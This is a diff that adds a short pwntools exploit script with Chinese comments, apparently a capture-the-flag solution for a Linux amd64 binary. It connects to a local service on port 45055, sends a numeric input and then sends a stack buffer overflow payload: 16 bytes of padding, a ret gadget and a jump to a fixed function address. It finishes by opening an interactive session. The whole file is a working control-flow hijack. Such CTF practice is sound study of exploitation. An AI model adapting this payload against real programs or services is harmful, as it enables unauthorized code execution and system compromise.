@@ -1,0 +1,18 @@
+from pwn import *                                    # 导入 pwntools。
+context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
+# io = process('./pwn')             # 在本地运行程序。
+# gdb.attach(io)                    # 启动 GDB
+io = connect("127.0.0.1",45055)          
+
+# io.recvuntil(b"hint.")
+# num = io.recv(8)
+# print(num)
+# num = u64(num.ljust(8,b"\x00")) 
+addr = 0x00000000004011B6
+main_addr = 0x0000000000401293
+ret = 0x40101a
+payload = b'A'* (8+8) + p64(ret) + p64(addr)
+io.sendline(b'50')
+io.send(payload)
+
+io.interactive()                
